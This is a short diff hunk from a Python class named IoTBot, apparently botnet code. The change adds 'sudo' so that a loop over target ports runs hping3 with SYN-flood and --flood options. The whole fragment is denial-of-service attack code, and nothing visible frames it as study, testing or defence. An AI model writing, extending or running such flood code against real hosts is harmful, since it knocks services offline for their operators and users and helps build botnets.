@@ -149,7 +149,7 @@ class IoTBot:
             
             for port in target_ports:
                 cmd = [
-                    "hping3", 
+                    "sudo", "hping3", 
                     "-S",              # SYN flood
                     "-p", str(port),   # Target port
                     "--flood",         # Flood mode
